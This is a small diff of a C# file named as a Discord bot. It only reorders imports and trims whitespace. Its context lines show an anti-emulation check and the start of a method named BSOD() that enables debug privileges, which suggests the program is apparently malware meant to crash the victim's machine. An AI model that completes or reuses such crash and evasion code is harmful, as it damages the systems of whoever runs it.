@@ -8,9 +8,8 @@ using System.Net;
 using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Security.Principal;
-using System.Threading;
-using System.Security.Cryptography;
 using System.ServiceProcess;
+using System.Threading;
 
 namespace MyCustomDiscordBot
 {
@@ -474,7 +473,7 @@ namespace MyCustomDiscordBot
                 Error("Emulation");
             }
         }
-     
+
         public static void BSOD()
         {
             Process.EnterDebugMode();
